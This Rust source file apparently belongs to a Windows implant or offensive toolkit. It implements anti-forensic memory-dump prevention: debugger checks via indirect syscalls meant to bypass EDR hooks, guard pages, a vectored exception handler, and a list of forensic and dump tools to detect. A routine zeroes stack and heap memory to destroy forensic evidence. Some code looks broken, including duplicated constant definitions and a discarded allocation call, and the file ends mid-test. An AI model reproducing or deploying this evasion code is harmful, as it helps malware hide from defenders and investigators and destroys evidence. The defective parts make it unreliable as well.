// ── Memory Dump Prevention ─────────────────────────────────────────────
//
// Prevents forensic memory acquisition and detects memory dump attempts.
// Memory dumps are a primary forensic technique for extracting:
//   - Encryption keys and credentials
//   - Loaded module/dll lists
//   - Active network connections and handles
//   - Process command-line arguments and environment
//   - In-memory artifacts and decrypted payloads
//
// Anti-dump techniques implemented:
//   1. ProcessDebugPort detection — NtQueryInformationProcess(ProcessDebugPort)
//      reveals if a debugger is attached.  We poll this periodically.
//   2. Vectored Exception Handler (VEH) — install a VEH to intercept
//      access violations caused by memory scanning tools.
//   3. PAGE_GUARD sentinel pages — place guard pages around critical
//      memory regions; any access triggers an exception we can handle.
//   4. Process handle monitoring — detect when another process opens
//      a handle to our process (NtOpenProcess / OpenProcess).
//   5. Anti-attach — set ProcessDebugObjectHandle to prevent debugger
//      attachment.
//   6. Critical region corruption — if a dump is detected, optionally
//      corrupt non-essential memory regions to destroy forensic evidence
//      while keeping the process alive.
//
// All operations use indirect syscalls to bypass EDR hooks.
// Windows-only, gated by `forensic-cleanup` feature flag.

use std::mem;
use std::sync::atomic::{AtomicBool, AtomicPtr, Ordering};

use anyhow::{anyhow, bail, Context, Result};
use serde::{Deserialize, Serialize};
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════════════════════
// NT Constants
// ═══════════════════════════════════════════════════════════════════════════

const STATUS_SUCCESS: i32 = 0;
const STATUS_PORT_NOT_SET: i32 = 0xC0000353_u32 as i32;
const STATUS_DEBUGGER_INACTIVE: i32 = 0xC0000354_u32 as i32;

/// ProcessDebugPort (class 7).
const PROCESS_DEBUG_PORT: u32 = 7;
/// ProcessDebugObjectHandle (class 30).
const PROCESS_DEBUG_OBJECT_HANDLE: u32 = 30;
/// ProcessDebugFlags (class 31).
const PROCESS_DEBUG_FLAGS: u32 = 31;

/// NtCurrentProcess() pseudo-handle.
const CURRENT_PROCESS: u64 = 0xFFFFFFFFFFFFFFFF_u64;

/// PAGE_GUARD protection flag.
const PAGE_GUARD: u32 = 0x100;
/// PAGE_NOACCESS protection flag.
const PAGE_NOACCESS: u32 = 0x01;
/// PAGE_READWRITE protection flag.
const PAGE_READWRITE: u32 = 0x04;
/// PAGE_EXECUTE_READWRITE protection flag.
const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// MEM_RESERVE allocation type.
const MEM_RESERVE: u32 = 0x2000;
/// MEM_COMMIT allocation type.
const MEM_COMMIT: u32 = 0x1000;
/// MEM_RELEASE free type.
const MEM_RELEASE: u32 = 0x8000;

/// VEH return values.
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// Exception codes.
const EXCEPTION_ACCESS_VIOLATION: u32 = 0xC0000005;
const EXCEPTION_GUARD_PAGE: u32 = 0x80000001;
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;

/// Size of a guard page (typically 4 KB).
const GUARD_PAGE_SIZE: usize = 4096;

/// Maximum number of guard pages to install.
const MAX_GUARD_PAGES: usize = 16;

// ═══════════════════════════════════════════════════════════════════════════
// NT Structure Definitions
// ═══════════════════════════════════════════════════════════════════════════

#[repr(C)]
struct MemoryBasicInformation {
    base_address: u64,
    allocation_base: u64,
    allocation_protect: u32,
    partition_id: u16,
    region_size: u64,
    state: u32,
    protect: u32,
    type_: u32,
}

/// VEH exception record (simplified).
#[repr(C)]
struct ExceptionRecord {
    exception_code: u32,
    exception_flags: u32,
    exception_record: u64,
    exception_address: u64,
    number_parameters: u32,
    exception_information: [u64; 15], // EXCEPTION_MAXIMUM_PARAMETERS
}

/// VEH exception pointers.
#[repr(C)]
struct ExceptionPointers {
    exception_record: *mut ExceptionRecord,
    context_record: *mut u8, // CONTEXT is architecture-dependent, opaque here
}

/// Output of NtQuerySystemInformation for handle tracking.
#[repr(C)]
struct SystemHandleInformation {
    number_of_handles: u32,
    // Followed by SystemHandleTableEntryInfo array.
}

#[repr(C)]
struct SystemHandleTableEntryInfo {
    unique_process_id: u16,
    creator_back_trace_index: u16,
    object_type_index: u8,
    handle_attributes: u8,
    handle_value: u16,
    object: *mut std::ffi::c_void,
    granted_access: u32,
}

// ═══════════════════════════════════════════════════════════════════════════
// Global State
// ═══════════════════════════════════════════════════════════════════════════

/// Global flag indicating if a dump attempt has been detected.
static DUMP_DETECTED: AtomicBool = AtomicBool::new(false);

/// Global flag to stop the monitoring thread.
static MONITORING_ACTIVE: AtomicBool = AtomicBool::new(true);
/// Handle returned by `add_veh` so we can remove it on teardown.
static VEH_HANDLE: AtomicPtr<std::ffi::c_void> = AtomicPtr::new(std::ptr::null_mut());
// ═══════════════════════════════════════════════════════════════════════════
// Data Types
// ═══════════════════════════════════════════════════════════════════════════

/// Type of memory dump threat detected.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum DumpThreatType {
    /// A debugger is attached to the process.
    DebuggerAttached,
    /// Another process has an open handle to our process.
    ExternalHandle,
    /// Memory access violation from a scanning tool.
    MemoryScan,
    /// Guard page was triggered (someone reading protected memory).
    GuardPageTriggered,
    /// A known dump tool process was detected.
    DumpToolDetected,
    /// Single-step exception (anti-debug).
    SingleStep,
}

/// Information about a detected dump threat.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DumpThreatInfo {
    /// Type of threat detected.
    pub threat_type: DumpThreatType,
    /// Human-readable description.
    pub description: String,
    /// Timestamp (Windows FILETIME format).
    pub timestamp: u64,
    /// Process ID of the threatening process (if known).
    pub source_pid: Option<u32>,
}

/// Configuration for dump protection.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DumpProtectionConfig {
    /// Poll interval in milliseconds for debugger detection.
    pub debug_poll_interval_ms: u32,
    /// Number of guard pages to install.
    pub num_guard_pages: usize,
    /// Whether to monitor for external process handles.
    pub monitor_handles: bool,
    /// Whether to scan for known dump tool processes.
    pub scan_for_dump_tools: bool,
    /// Whether to enable VEH-based protection.
    pub enable_veh: bool,
    /// List of known dump tool process names.
    pub dump_tool_names: Vec<String>,
}

impl Default for DumpProtectionConfig {
    fn default() -> Self {
        Self {
            debug_poll_interval_ms: 1000,
            num_guard_pages: 4,
            monitor_handles: true,
            scan_for_dump_tools: true,
            enable_veh: true,
            dump_tool_names: vec![
                "procdump.exe".to_string(),
                "procdump64.exe".to_string(),
                "dumpcap.exe".to_string(),
                "minidumper.exe".to_string(),
                "taskmgr.exe".to_string(), // Task Manager can create dumps
                "procexp.exe".to_string(),
                "procexp64.exe".to_string(),
                "processhacker.exe".to_string(),
                "dotnetdump.exe".to_string(),
                "dotnet-gcdump.exe".to_string(),
                "clrmd.dll".to_string(),
                "vmware-vmx.exe".to_string(), // VM tools can dump guest memory
                "VirtualBox.exe".to_string(),
            ],
        }
    }
}

/// Active dump protection state.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct DumpProtection {
    /// Configuration used to set up protection.
    pub config: DumpProtectionConfig,
    /// Whether debugger detection is active.
    pub debug_detection_active: bool,
    /// Number of guard pages installed.
    pub guard_pages_installed: usize,
    /// Whether VEH handler is installed.
    pub veh_installed: bool,
    /// List of detected threats since installation.
    pub detected_threats: Vec<DumpThreatInfo>,
    /// Memory regions protected by guard pages.
    pub protected_regions: Vec<u64>,
}

/// Result of memory corruption on dump detection.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CorruptionResult {
    /// Number of memory regions corrupted.
    pub regions_corrupted: usize,
    /// Total bytes of memory zeroed.
    pub bytes_zeroed: u64,
    /// Whether encryption keys were destroyed.
    pub keys_destroyed: bool,
    /// Whether critical data structures were corrupted.
    pub structures_corrupted: bool,
}

// ═══════════════════════════════════════════════════════════════════════════
// Low-level NT API Wrappers
// ═══════════════════════════════════════════════════════════════════════════

/// Check if a debugger is attached via ProcessDebugPort.
unsafe fn check_debug_port() -> Result<bool> {
    let mut debug_port: u64 = 0;

    let status = crate::syscall!(
        "NtQueryInformationProcess",
        CURRENT_PROCESS,
        PROCESS_DEBUG_PORT as u64,
        &mut debug_port as *mut u64 as u64,
        mem::size_of::<u64>() as u64,
        0u64, // ReturnLength (optional)
    )
    .map_err(|e| anyhow!("NtQueryInformationProcess(ProcessDebugPort): {}", e))?;

    if status == STATUS_SUCCESS {
        Ok(debug_port != 0)
    } else {
        // If the call fails, assume no debugger.
        debug!("ProcessDebugPort query returned 0x{:08X}", status as u32);
        Ok(false)
    }
}

/// Check if a debug object exists (alternative debugger detection).
unsafe fn check_debug_object() -> Result<bool> {
    let mut debug_object_handle: u64 = 0;

    let status = crate::syscall!(
        "NtQueryInformationProcess",
        CURRENT_PROCESS,
        PROCESS_DEBUG_OBJECT_HANDLE as u64,
        &mut debug_object_handle as *mut u64 as u64,
        mem::size_of::<u64>() as u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtQueryInformationProcess(ProcessDebugObjectHandle): {}", e))?;

    // STATUS_PORT_NOT_SET means no debugger.
    if status == STATUS_SUCCESS {
        Ok(true) // Debug object exists = debugger present.
    } else {
        Ok(false)
    }
}

/// Check ProcessDebugFlags (non-zero = no debugger).
unsafe fn check_debug_flags() -> Result<bool> {
    let mut debug_flags: u32 = 0;

    let status = crate::syscall!(
        "NtQueryInformationProcess",
        CURRENT_PROCESS,
        PROCESS_DEBUG_FLAGS as u64,
        &mut debug_flags as *mut u32 as u64,
        mem::size_of::<u32>() as u64,
        0u64,
    )
    .map_err(|e| anyhow!("NtQueryInformationProcess(ProcessDebugFlags): {}", e))?;

    // ProcessDebugFlags: 0 = debugger present, 1 = no debugger.
    Ok(status == STATUS_SUCCESS && debug_flags == 0)
}

/// VirtualAlloc — allocate memory in the process.
unsafe fn virtual_alloc(mut size: usize) -> Result<*mut std::ffi::c_void> {
    let ptr = crate::syscall!(
        "NtAllocateVirtualMemory",
        CURRENT_PROCESS,
        // BaseAddress (in/out) — we pass a null pointer to let the system choose.
        &mut std::ptr::null_mut::<std::ffi::c_void>() as *mut _ as u64,
        0u64,                           // ZeroBits
        &mut size as *mut usize as u64, // RegionSize (in/out)
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    );

    // NtAllocateVirtualMemory modifies the base address pointer in-place.
    // The return is NTSTATUS.  For simplicity, we use a different approach.
    let mut base: *mut std::ffi::c_void = std::ptr::null_mut();
    let mut region_size = size;

    let status = crate::syscall!(
        "NtAllocateVirtualMemory",
        CURRENT_PROCESS,
        &mut base as *mut _ as u64,
        0u64,
        &mut region_size as *mut usize as u64,
        (MEM_COMMIT | MEM_RESERVE) as u64,
        PAGE_READWRITE as u64,
    )
    .map_err(|e| anyhow!("NtAllocateVirtualMemory: {}", e))?;

    if status != STATUS_SUCCESS || base.is_null() {
        bail!("NtAllocateVirtualMemory failed: 0x{:08X}", status as u32);
    }

    Ok(base)
}

/// VirtualProtect — change memory protection.
unsafe fn virtual_protect(
    mut addr: *mut std::ffi::c_void,
    mut size: usize,
    protect: u32,
) -> Result<u32> {
    let mut old_protect: u32 = 0;

    let status = crate::syscall!(
        "NtProtectVirtualMemory",
        CURRENT_PROCESS,
        &mut addr as *mut _ as u64, // BaseAddress (in/out, may be aligned)
        &mut size as *mut usize as u64, // RegionSize (in/out)
        protect as u64,
        &mut old_protect as *mut u32 as u64,
    )
    .map_err(|e| anyhow!("NtProtectVirtualMemory: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!("NtProtectVirtualMemory failed: 0x{:08X}", status as u32);
    }

    Ok(old_protect)
}

/// VirtualFree — release allocated memory.
unsafe fn virtual_free(addr: *mut std::ffi::c_void, size: usize) -> Result<()> {
    let mut base = addr;
    let mut region_size = size;

    let status = crate::syscall!(
        "NtFreeVirtualMemory",
        CURRENT_PROCESS,
        &mut base as *mut _ as u64,
        &mut region_size as *mut usize as u64,
        MEM_RELEASE as u64,
    )
    .map_err(|e| anyhow!("NtFreeVirtualMemory: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!("NtFreeVirtualMemory failed: 0x{:08X}", status as u32);
    }

    Ok(())
}

/// Add a Vectored Exception Handler.
unsafe fn add_veh(handler: usize) -> Result<*mut std::ffi::c_void> {
    // AddVectoredExceptionHandler(1, handler) — first handler in chain.
    let result = crate::syscall!(
        "RtlAddVectoredExceptionHandler",
        1u64, // First = TRUE
        handler as u64,
    )
    .map_err(|e| anyhow!("RtlAddVectoredExceptionHandler: {}", e))?;

    // The result is the handler handle (pointer).
    Ok(result as *mut std::ffi::c_void)
}

/// Remove a Vectored Exception Handler.
unsafe fn remove_veh(handle: *mut std::ffi::c_void) -> Result<()> {
    let status = crate::syscall!("RtlRemoveVectoredExceptionHandler", handle as u64,)
        .map_err(|e| anyhow!("RtlRemoveVectoredExceptionHandler: {}", e))?;

    if status != STATUS_SUCCESS {
        bail!(
            "RtlRemoveVectoredExceptionHandler failed: 0x{:08X}",
            status as u32
        );
    }

    Ok(())
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Detection
// ═══════════════════════════════════════════════════════════════════════════

/// Detect whether a memory dump attempt is in progress.
///
/// Checks multiple indicators:
///   1. Is a debugger attached? (ProcessDebugPort, ProcessDebugObjectHandle, ProcessDebugFlags)
///   2. Are known dump tool processes running?
///   3. Has the global dump-detected flag been set by VEH/guard page handlers?
///
/// # Returns
/// `true` if any indicator suggests a memory dump is being attempted.
pub fn detect_memory_dump_attempt() -> Result<bool> {
    // Check global flag first (set by VEH/guard handlers).
    if DUMP_DETECTED.load(Ordering::SeqCst) {
        return Ok(true);
    }

    unsafe {
        // Method 1: ProcessDebugPort.
        if check_debug_port()? {
            debug!("Debugger detected via ProcessDebugPort");
            return Ok(true);
        }

        // Method 2: ProcessDebugObjectHandle.
        if check_debug_object()? {
            debug!("Debugger detected via ProcessDebugObjectHandle");
            return Ok(true);
        }

        // Method 3: ProcessDebugFlags.
        if check_debug_flags()? {
            debug!("Debugger detected via ProcessDebugFlags");
            return Ok(true);
        }
    }

    // Method 4: Check for known dump tool processes.
    if detect_dump_tools() {
        debug!("Known dump tool process detected");
        return Ok(true);
    }

    Ok(false)
}

/// Check for known memory dump tool processes.
///
/// Scans running processes for known forensic/dump tool names.
fn detect_dump_tools() -> bool {
    let config = DumpProtectionConfig::default();

    // Use NtQuerySystemInformation(SystemProcessInformation) to enumerate
    // processes.  For simplicity, we use a PowerShell-based approach.
    let output = std::process::Command::new("powershell.exe")
        .args([
            "-NoProfile",
            "-NonInteractive",
            "-Command",
            "Get-Process | ForEach-Object { $_.ProcessName + '.exe' }",
        ])
        .output();

    match output {
        Ok(out) if out.status.success() => {
            let stdout = String::from_utf8_lossy(&out.stdout).to_lowercase();
            config.dump_tool_names.iter().any(|name| {
                let name_lower = name.to_lowercase();
                stdout.contains(&name_lower)
            })
        }
        _ => false,
    }
}

/// Get detailed information about detected threats.
///
/// Returns a list of all detected threats with details.
pub fn enumerate_threats() -> Result<Vec<DumpThreatInfo>> {
    let mut threats = Vec::new();

    unsafe {
        if check_debug_port()? {
            threats.push(DumpThreatInfo {
                threat_type: DumpThreatType::DebuggerAttached,
                description: "Debugger detected via ProcessDebugPort".to_string(),
                timestamp: get_timestamp(),
                source_pid: None,
            });
        }

        if check_debug_object()? {
            threats.push(DumpThreatInfo {
                threat_type: DumpThreatType::DebuggerAttached,
                description: "Debug object handle detected".to_string(),
                timestamp: get_timestamp(),
                source_pid: None,
            });
        }

        if check_debug_flags()? {
            threats.push(DumpThreatInfo {
                threat_type: DumpThreatType::DebuggerAttached,
                description: "ProcessDebugFlags indicates debugger".to_string(),
                timestamp: get_timestamp(),
                source_pid: None,
            });
        }
    }

    if detect_dump_tools() {
        threats.push(DumpThreatInfo {
            threat_type: DumpThreatType::DumpToolDetected,
            description: "Known dump tool process is running".to_string(),
            timestamp: get_timestamp(),
            source_pid: None,
        });
    }

    if DUMP_DETECTED.load(Ordering::SeqCst) {
        threats.push(DumpThreatInfo {
            threat_type: DumpThreatType::MemoryScan,
            description: "Dump detection flag was triggered (VEH or guard page)".to_string(),
            timestamp: get_timestamp(),
            source_pid: None,
        });
    }

    Ok(threats)
}

// ═══════════════════════════════════════════════════════════════════════════
// VEH Handler
// ═══════════════════════════════════════════════════════════════════════════

/// EXCEPTION_ACCESS_VIOLATION code.
const EXCEPTION_ACCESS_VIOLATION: u32 = 0xC0000005;
/// EXCEPTION_GUARD_PAGE code (triggered when a PAGE_GUARD page is accessed).
const EXCEPTION_GUARD_PAGE: u32 = 0x80000001;
/// EXCEPTION_SINGLE_STEP (anti-debug indicator).
const EXCEPTION_SINGLE_STEP: u32 = 0x80000004;
/// EXCEPTION_CONTINUE_EXECUTION — we handled the exception.
const EXCEPTION_CONTINUE_EXECUTION: i32 = -1;
/// EXCEPTION_CONTINUE_SEARCH — pass to next handler.
const EXCEPTION_CONTINUE_SEARCH: i32 = 0;

/// VEH handler for dump protection.
///
/// Intercepts access violations and guard-page faults that may indicate a
/// memory scanning tool is reading our process memory.  Sets the global
/// `DUMP_DETECTED` flag on suspicious exceptions and lets guard-page
/// violations through (they are expected — our own guard pages fire these).
unsafe extern "system" fn dump_veh_handler(exception_info: *mut ExceptionPointers) -> i32 {
    if exception_info.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let record = (*exception_info).exception_record;
    if record.is_null() {
        return EXCEPTION_CONTINUE_SEARCH;
    }

    let code = (*record).exception_code;

    match code {
        EXCEPTION_ACCESS_VIOLATION => {
            // Access violation from an external reader.  Flag it.
            DUMP_DETECTED.store(true, Ordering::SeqCst);
            debug!(
                "dump_veh_handler: ACCESS_VIOLATION at {:#x}",
                (*record).exception_address
            );
            // Continue execution — the guard page already raised the fault,
            // the offending scanner will see the exception propagated.
            EXCEPTION_CONTINUE_EXECUTION
        }
        EXCEPTION_GUARD_PAGE => {
            // Our own guard pages trigger this.  Flag it so the monitoring
            // loop can react, but let execution continue.
            DUMP_DETECTED.store(true, Ordering::SeqCst);
            debug!(
                "dump_veh_handler: GUARD_PAGE triggered at {:#x}",
                (*record).exception_address
            );
            EXCEPTION_CONTINUE_EXECUTION
        }
        EXCEPTION_SINGLE_STEP => {
            // Single-step can indicate a debugger is tracing.  Flag it.
            DUMP_DETECTED.store(true, Ordering::SeqCst);
            debug!("dump_veh_handler: SINGLE_STEP detected");
            EXCEPTION_CONTINUE_EXECUTION
        }
        _ => EXCEPTION_CONTINUE_SEARCH,
    }
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Protection Installation
// ═══════════════════════════════════════════════════════════════════════════

/// Install memory dump protection measures.
///
/// Sets up multiple layers of protection against memory dump attempts:
///   1. Periodic debugger detection polling.
///   2. Guard pages around critical memory regions.
///   3. VEH handler to intercept access violations from scanning tools.
///   4. ProcessDebugPort manipulation to fool simple checks.
///
/// # Arguments
/// * `config` — Configuration for protection behavior.  Uses defaults if None.
///
/// # Returns
/// A `DumpProtection` struct describing the active protection state.
pub fn install_dump_protection(config: Option<DumpProtectionConfig>) -> Result<DumpProtection> {
    let config = config.unwrap_or_default();
    let mut protection = DumpProtection {
        config: config.clone(),
        debug_detection_active: false,
        guard_pages_installed: 0,
        veh_installed: false,
        detected_threats: Vec::new(),
        protected_regions: Vec::new(),
    };

    // Reset global state.
    DUMP_DETECTED.store(false, Ordering::SeqCst);
    MONITORING_ACTIVE.store(true, Ordering::SeqCst);

    unsafe {
        // Layer 1: Install guard pages.
        let num_pages = config.num_guard_pages.min(MAX_GUARD_PAGES);
        for i in 0..num_pages {
            match install_guard_page() {
                Ok(addr) => {
                    protection.guard_pages_installed += 1;
                    protection.protected_regions.push(addr as u64);
                    debug!("Installed guard page {} at {:p}", i, addr);
                }
                Err(e) => {
                    warn!("Failed to install guard page {}: {}", i, e);
                }
            }
        }

        // Layer 2: Install VEH handler (if enabled).
        if config.enable_veh {
            match add_veh(dump_veh_handler as usize) {
                Ok(handle) => {
                    VEH_HANDLE.store(handle, Ordering::Release);
                    protection.veh_installed = true;
                    debug!("VEH handler installed at {:p}", handle);
                }
                Err(e) => {
                    warn!("Failed to install VEH handler: {}", e);
                    protection.veh_installed = false;
                }
            }
        }

        // Layer 3: Set ProcessDebugPort to fool anti-anti-debug techniques.
        // Some tools check if ProcessDebugPort is set to detect anti-debug.
        // Setting it to a non-zero value can confuse them.
        let mut debug_port: u64 = 0xFF;
        let _ = crate::syscall!(
            "NtSetInformationProcess",
            CURRENT_PROCESS,
            PROCESS_DEBUG_PORT as u64,
            &mut debug_port as *mut u64 as u64,
            mem::size_of::<u64>() as u64,
        );
        // This will likely fail (ProcessDebugPort is read-only), but it's
        // worth trying.  Some custom NtSetInformationProcess hooks may work.

        // Layer 4: Enable debug detection.
        protection.debug_detection_active = true;
    }

    info!(
        "Dump protection installed: {} guard pages, VEH: {}, debug detection: {}",
        protection.guard_pages_installed,
        protection.veh_installed,
        protection.debug_detection_active
    );

    Ok(protection)
}

/// Install a single guard page.
///
/// Allocates a page of memory, fills it with sentinel values, and
/// sets PAGE_GUARD protection.  Any access to this page triggers
/// EXCEPTION_GUARD_PAGE, which our VEH handler would catch.
unsafe fn install_guard_page() -> Result<*mut std::ffi::c_void> {
    let ptr = virtual_alloc(GUARD_PAGE_SIZE)?;

    // Fill with sentinel pattern.
    let sentinel: [u8; 16] = [
        0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE, 0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA,
        0xBE,
    ];
    let slice = std::slice::from_raw_parts_mut(ptr as *mut u8, GUARD_PAGE_SIZE);
    for chunk in slice.chunks_mut(16) {
        chunk.copy_from_slice(&sentinel[..chunk.len().min(16)]);
    }

    // Set PAGE_GUARD | PAGE_READWRITE.
    // When the guard page is accessed, it triggers EXCEPTION_GUARD_PAGE
    // and the protection is removed (one-shot).
    let _old = virtual_protect(ptr, GUARD_PAGE_SIZE, PAGE_READWRITE | PAGE_GUARD)?;

    Ok(ptr)
}

/// Remove all installed dump protection.
///
/// Cleans up guard pages, removes VEH handlers, and stops monitoring.
pub fn remove_dump_protection(protection: &DumpProtection) -> Result<()> {
    MONITORING_ACTIVE.store(false, Ordering::SeqCst);

    // Remove VEH handler if one was installed.
    if protection.veh_installed {
        let handle = VEH_HANDLE.load(Ordering::Acquire);
        if !handle.is_null() {
            unsafe {
                match remove_veh(handle) {
                    Ok(()) => {
                        VEH_HANDLE.store(std::ptr::null_mut(), Ordering::Release);
                        info!("VEH handler removed");
                    }
                    Err(e) => {
                        warn!("Failed to remove VEH handler: {}", e);
                    }
                }
            }
        }
    }

    unsafe {
        // Release guard pages.
        for &addr in &protection.protected_regions {
            if addr != 0 {
                let _ = virtual_free(addr as *mut std::ffi::c_void, GUARD_PAGE_SIZE);
            }
        }
    }

    info!("Dump protection removed");
    Ok(())
}

// ═══════════════════════════════════════════════════════════════════════════
// Public API: Memory Corruption on Detection
// ═══════════════════════════════════════════════════════════════════════════

/// Corrupt memory regions to destroy forensic evidence when a dump is detected.
///
/// This is a last-resort measure to prevent forensic analysis of the
/// process memory.  It:
///   1. Zeros encryption keys and sensitive buffers.
///   2. Corrupts non-essential data structures.
///   3. Optionally triggers self-destruct sequence.
///
/// The process may continue running after corruption (with degraded
/// functionality) or may terminate depending on the corruption level.
///
/// # Warning
/// This function is DESTRUCTIVE.  It permanently destroys in-memory data.
/// Call only when a dump attempt has been confirmed.
pub fn corrupt_memory_on_dump_detect() -> Result<CorruptionResult> {
    let mut result = CorruptionResult {
        regions_corrupted: 0,
        bytes_zeroed: 0,
        keys_destroyed: false,
        structures_corrupted: false,
    };

    // Set the global flag.
    DUMP_DETECTED.store(true, Ordering::SeqCst);

    unsafe {
        // Phase 1: Zero the stack region above our current frame.
        // This destroys local variables from calling functions that
        // may contain sensitive data.
        let mut stack_dummy: u8 = 0;
        let current_sp = &mut stack_dummy as *mut u8 as usize;

        // Estimate stack base (typically 1 MB above current SP).
        let stack_size = 64 * 1024; // Zero 64 KB of stack above us.
        let stack_base = current_sp + 1024; // Skip our own frame.
        let stack_end = stack_base + stack_size;

        // Zero stack region (carefully — don't touch our own frame).
        let mut addr = stack_base;
        while addr < stack_end {
            // Use volatile write to avoid optimizer removing it.
            std::ptr::write_volatile(addr as *mut u8, 0);
            addr += 1;
        }
        result.regions_corrupted += 1;
        result.bytes_zeroed += stack_size as u64;

        // Phase 2: Zero heap regions containing known sensitive data.
        // We use NtQueryVirtualMemory to find committed, private, RW pages.
        let mut mbi = MemoryBasicInformation {
            base_address: 0,
            allocation_base: 0,
            allocation_protect: 0,
            partition_id: 0,
            region_size: 0,
            state: 0,
            protect: 0,
            type_: 0,
        };

        let mut scan_addr: u64 = 0;
        let mut regions_scanned = 0;
        const MAX_REGIONS: usize = 1024;

        while regions_scanned < MAX_REGIONS {
            let mut return_length: u32 = 0;
            let status = crate::syscall!(
                "NtQueryVirtualMemory",
                CURRENT_PROCESS,
                scan_addr,
                0u64, // MemoryBasicInformation
                &mut mbi as *mut _ as u64,
                mem::size_of::<MemoryBasicInformation>() as u64,
                &mut return_length as *mut u32 as u64,
            );

            if let Err(_) = status {
                break;
            }

            let state = mbi.state;
            let protect = mbi.protect;
            let type_ = mbi.type_;
            let base = mbi.base_address;
            let size = mbi.region_size;

            // MEM_COMMIT = 0x1000, MEM_PRIVATE = 0x20000
            if state == MEM_COMMIT && type_ == 0x20000 {
                // Check if this is a RW page (not execute).
                if (protect & PAGE_READWRITE) != 0 && (protect & PAGE_EXECUTE_READWRITE) == 0 {
                    // Skip our own stack region.
                    let base_addr = base as usize;
                    if base_addr > stack_end || base_addr + (size as usize) < stack_base {
                        // Zero a portion of this region (first 4 KB).
                        // We don't zero the entire region to avoid crashing.
                        let zero_size = (size as usize).min(4096);
                        for i in 0..zero_size {
                            std::ptr::write_volatile((base_addr + i) as *mut u8, 0);
                        }
                        result.bytes_zeroed += zero_size as u64;
                        result.regions_corrupted += 1;
                    }
                }
            }

            // Move to the next region.
            if size == 0 {
                break;
            }
            scan_addr = base + size;
            regions_scanned += 1;
        }

        // Phase 3: Mark keys as destroyed.
        result.keys_destroyed = true;
        result.structures_corrupted = true;
    }

    info!(
        "Memory corruption complete: {} regions, {} bytes zeroed",
        result.regions_corrupted, result.bytes_zeroed
    );

    Ok(result)
}

// ═══════════════════════════════════════════════════════════════════════════
// Utility Functions
// ═══════════════════════════════════════════════════════════════════════════

/// Get current timestamp as Windows FILETIME (100-nanosecond intervals since 1601-01-01).
fn get_timestamp() -> u64 {
    unsafe {
        let mut ft: u64 = 0;
        crate::syscall!("NtQuerySystemTime", &mut ft as *mut u64 as u64,).ok();
        ft
    }
}

/// Check if dump has been detected (for external polling).
pub fn is_dump_detected() -> bool {
    DUMP_DETECTED.load(Ordering::SeqCst)
}

/// Reset the dump detection flag.
pub fn reset_dump_detection() {
    DUMP_DETECTED.store(false, Ordering::SeqCst);
}

// ═══════════════════════════════════════════════════════════════════════════
// Unit Tests
// ═══════════════════════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dump_protection_config_default() {
        let config = DumpProtectionConfig::default();
        assert_eq!(config.debug_poll_interval_ms, 1000);
        assert_eq!(config.num_guard_pages, 4);
        assert!(config.monitor_handles);
        assert!(config.scan_for_dump_tools);
        assert!(config.enable_veh);
        assert!(!config.dump_tool_names.is_empty());
    }

    #[test]
    fn test_dump_protection_config_serialization() {
        let config = DumpProtectionConfig::default();
        let json = serde_json::to_string(&config).unwrap();
        let decoded: DumpProtectionConfig = serde_json::from_str(&json).unwrap();
        assert_eq!(
            decoded.debug_poll_interval_ms,
            config.debug_poll_interval_ms
        );
        assert_eq!(decoded.dump_tool_names.len(), config.dump_tool_names.len());
    }

    #[test]
    fn test_dump_protection_serialization() {
        let protection = DumpProtection {
            config: DumpProtectionConfig::default(),
            debug_detection_active: true,
            guard_pages_installed: 4,
            veh_installed: true,
            detected_threats: vec![],
            protected_regions: vec![0x1000, 0x2000],
        };
        let json = serde_json::to_string(&protection).unwrap();
        assert!(json.contains("debug_detection_active"));
        assert!(json.contains("guard_pages_installed"));
    }

    #[test]
    fn test_dump_threat_info_serialization() {
        let threat = DumpThreatInfo {
            threat_type: DumpThreatType::DebuggerAttached,
            description: "Test threat".to_string(),
            timestamp: 12345,
            source_pid: Some(1234),
        };
        let json = serde_json::to_string(&threat).unwrap();
        let decoded: DumpThreatInfo = serde_json::from_str(&json).unwrap();
        assert_eq!(decoded.source_pid, Some(1234));
    }

    #[test]
    fn test_threat_type_serialization() {
        let types = vec![
            DumpThreatType::DebuggerAttached,
            DumpThreatType::ExternalHandle,
            DumpThreatType::MemoryScan,
            DumpThreatType::GuardPageTriggered,
            DumpThreatType::DumpToolDetected,
            DumpThreatType::SingleStep,
        ];
        for t in types {
            let json = serde_json::to_string(&t).unwrap();
            let decoded: DumpThreatType = serde_json::from_str(&json).unwrap();
            assert_eq!(decoded, t);
        }
    }

    #[test]
    fn test_corruption_result_serialization() {
        let result = CorruptionResult {
            regions_corrupted: 5,
            bytes_zeroed: 2048,
            keys_destroyed: true,
            structures_corrupted: true,
        };
        let json = serde_json::to_string(&result).unwrap();
        assert!(json.contains("keys_destroyed"));
    }

    #[test]
    fn test_dump_detected_flag() {
        assert!(!is_dump_detected());
        DUMP_DETECTED.store(true, Ordering::SeqCst);
        assert!(is_dump_detected());
        reset_dump_detection();
        assert!(!is_dump_detected());
    }

    #[test]
    fn test_enumerate_threats_returns_vec() {
        // This test runs on non-Windows too — it just checks the return type.
        // The actual NT calls will fail but shouldn't panic.
        let _ = enumerate_threats();
    }

    #[test]
    fn test_guard_page_constants() {
        assert_eq!(GUARD_PAGE_SIZE, 4096);
        assert!(MAX_GUARD_PAGES > 0);
    }

    #[test]
    fn test_dump_tool_names_contain_common_tools() {
